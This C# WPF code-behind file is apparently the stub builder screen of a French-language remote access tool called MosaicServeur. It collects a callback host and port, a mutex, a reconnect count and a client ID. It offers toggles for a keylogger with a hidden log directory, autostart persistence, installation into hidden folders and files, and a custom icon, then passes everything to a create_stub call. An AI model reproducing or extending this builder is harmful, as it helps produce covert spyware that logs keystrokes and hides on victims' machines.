using MosaicServeur.Main;
using Serveur.Controllers;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;

namespace MosaicServeur
{
    /// <summary>
    /// Logique d'interaction pour Builder.xaml
    /// </summary>
    public partial class Builder : UserControl
    {
        private FrmBuilderController buildercontroller = new FrmBuilderController();
        private int PORT = 0;
        private int RECONNECT = 0;


        public Builder()
        {
            InitializeComponent();
            txtMutex.Text = buildercontroller.getUniqueMutex(18);
        }

        private void Load(object sender, RoutedEventArgs e)
        {
            GridCursor.Margin = new Thickness(0 + (110 *0), 20, 0, 0);
            tcSample.SelectedIndex = 0;
            var i = (ClientsListView.connectedClients() + 1).ToString();
            txtClientID.Text = string.Format("Client {0}", int.Parse(i) < 10 && int.Parse(i) > 0 ? "0" + i : i);
            lblLogDir.Foreground = new SolidColorBrush(Colors.LightGray);
            txtLogDir.IsEnabled = false;
            chkKeyLogger.IsChecked = false;
            chkHideLogsDir.IsEnabled = false;
            chkAutoStart.IsChecked = false;
            chkIcon.IsChecked = false;
            txtStartupName.IsEnabled = false;
            txtStartupName.Text = "";
            txtSubDirI.Text = "";
            txtFileNameI.Text = "";
            txtLogDir.Text = "";
            txtAddIcon.Text = "";
            radioGroup.IsEnabled = false;
            spSubDirectory.IsEnabled = false;
            spFileName.IsEnabled = false;
            chkInstall.IsChecked = false;
            radio1.IsChecked = true;
            chkHideSubDirI.IsChecked = false;
            chkHideFileI.IsChecked = false;
            chkHideLogsDir.IsChecked = false;
            lblDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
            lblSubDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
            lblFileName.Foreground = new SolidColorBrush(Colors.LightGray);
            lblStartupName.Foreground = new SolidColorBrush(Colors.LightGray);
        }

        private void btnTabControl(object sender, RoutedEventArgs e)
        {
            int index = int.Parse(((Button)e.Source).Uid);

            GridCursor.Margin = new Thickness(0 + (110 * index), 20, 0, 0);

            switch (index)
            {
                case 0:
                    tcSample.SelectedIndex = 0;
                    break;
                case 1:
                    tcSample.SelectedIndex = 1;
                    break;
                case 2:
                    tcSample.SelectedIndex = 2;
                    break;
                default:
                    break;
            }
        }       

        private void btnBuild(object sender, RoutedEventArgs e)
        {
            buildercontroller.create_stub(txtHost.Text, txtPort.Text, txtMutex.Text, txtRecoTries.Text, txtClientID.Text,
                txtLogDir.Text, txtStartupName.Text, txtSubDirI.Text, txtFileNameI.Text, getInstallPath(), getChkValues(), chkIcon.IsChecked.Value, txtAddIcon.Text); 
        }

        private string getInstallPath()
        {
            string i = "";
            if(radio1.IsChecked == true)
                i = "1";
            else if(radio2.IsChecked == true)
                i = "2";
            else if(radio3.IsChecked == true)
                i = "3";
            return i;
        }   

        private string getTxtInstall()
        {
            string txtInstaller = "";
            txtInstaller += txtSubDirI.Text +'&';
            return txtInstaller;
        }

        private string getChkValues()
        {
            string trueOrFalse = "";
            trueOrFalse += chkKeyLogger.IsChecked   == true ? "1" : "0"; // KEYLOGGER
            trueOrFalse += chkHideLogsDir.IsChecked == true ? "1" : "0"; // KEYLOGGER
            trueOrFalse += chkAutoStart.IsChecked   == true ? "1" : "0"; // AutoStartup
            trueOrFalse += chkInstall.IsChecked     == true ? "1" : "0"; // INSTALL
            trueOrFalse += chkHideSubDirI.IsChecked == true ? "1" : "0"; // INSTALL
            trueOrFalse += chkHideFileI.IsChecked   == true ? "1" : "0"; // INSTALL
            return trueOrFalse;
        }

        private void btnMutex(object sender, RoutedEventArgs e)
        {
            txtMutex.Text = buildercontroller.getUniqueMutex(18);
        }

        private void chkKeyLoggerEvent(object sender, RoutedEventArgs e)
        {
            if (chkKeyLogger.IsChecked.Value == true)
            {
                txtLogDir.IsEnabled = true;
                chkHideLogsDir.IsEnabled = true;
                lblLogDir.Foreground = new SolidColorBrush(Colors.Black);
            }
            else
            {
                txtLogDir.IsEnabled = false;
                chkHideLogsDir.IsEnabled = false;
                chkHideLogsDir.IsChecked = false;
                lblLogDir.Foreground = new SolidColorBrush(Colors.LightGray);
            }
        }

        private void chkAutoStartEvent(object sender, RoutedEventArgs e)
        {
            if (chkAutoStart.IsChecked.Value == true)
            {
                txtStartupName.IsEnabled = true;
                lblStartupName.Foreground = new SolidColorBrush(Colors.Black);
            }
            else
            {
                txtStartupName.IsEnabled = false;
                lblStartupName.Foreground = new SolidColorBrush(Colors.LightGray);
            }
        }

        private void chkInstallEvent(object sender, RoutedEventArgs e)
        {
            if (chkInstall.IsChecked.Value == true)
            {
                radioGroup.IsEnabled = true;
                spSubDirectory.IsEnabled = true;
                spFileName.IsEnabled = true;
                lblDirectory.Foreground = new SolidColorBrush(Colors.Black);
                lblSubDirectory.Foreground = new SolidColorBrush(Colors.Black);
                lblFileName.Foreground = new SolidColorBrush(Colors.Black);
            }
            else
            {
                radioGroup.IsEnabled = false;
                spSubDirectory.IsEnabled = false;
                spFileName.IsEnabled = false;
                lblDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
                lblSubDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
                lblFileName.Foreground = new SolidColorBrush(Colors.LightGray);
            }
        }

        private void chkIconEvent(object sender, RoutedEventArgs e)
        {
            if (chkIcon.IsChecked.Value == true)
            {
                txtAddIcon.IsEnabled = true;
                btnAddIcon.IsEnabled = true;
            }
            else
            {
                txtAddIcon.IsEnabled = false;
                btnAddIcon.IsEnabled = false;
                txtAddIcon.Text = "";
            }
        }

        private void addIcon(object sender, RoutedEventArgs e)
        {
            var FD = new System.Windows.Forms.OpenFileDialog();
            if (FD.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string fileToOpen = FD.FileName;
                txtAddIcon.Text = fileToOpen;
            }
        }

        /************************************************************************************
         *                                  PORT NUMERIC                                    *
         * *********************************************************************************/

        public int numPort
        {
            get { return PORT; }
            set
            {
                if (PORT >= 0)
                    PORT = value;

                txtPort.Text = PORT.ToString();
            }
        }

        private void cmdUp_Click(object sender, RoutedEventArgs e)
        {
            if ((int.Parse(txtPort.Text)) < 65535)
                numPort++;
        }

        private void cmdDown_Click(object sender, RoutedEventArgs e)
        {
            if ((int.Parse(txtPort.Text)) > 0)
                numPort--;
        }

        private void txtNum_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (txtPort == null)
            {
                return;
            }

            if (!int.TryParse(txtPort.Text, out PORT))
            {
                txtPort.Text = PORT.ToString();
            }

            if ((int.Parse(txtPort.Text) > 65535))
            {
                txtPort.Text = 0.ToString();
            }

            if (!(int.Parse(txtPort.Text) > 0))
            {
                txtPort.Text = 0.ToString();
            }
        }

        /************************************************************************************
         *                              RECONNECT TRIES NUMERIC                             *
         * *********************************************************************************/

        public int recoTries
        {
            get { return RECONNECT; }
            set
            {
                if (RECONNECT >= 0)
                    RECONNECT = value;

                txtRecoTries.Text = RECONNECT.ToString();
            }
        }

        private void recoCmdUp_Click(object sender, RoutedEventArgs e)
        {
                recoTries++;
        }

        private void recoCmdDown_Click(object sender, RoutedEventArgs e)
        {
            if ((int.Parse(txtRecoTries.Text)) > 0)
                recoTries--;
        }

        private void txtReco_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (txtRecoTries == null)
            {
                return;
            }

            if (!int.TryParse(txtRecoTries.Text, out RECONNECT))
            {
                txtRecoTries.Text = RECONNECT.ToString();
            }

            if (!(int.Parse(txtRecoTries.Text) > 0))
            {
                txtRecoTries.Text = RECONNECT.ToString();
            }
        }
    }
}
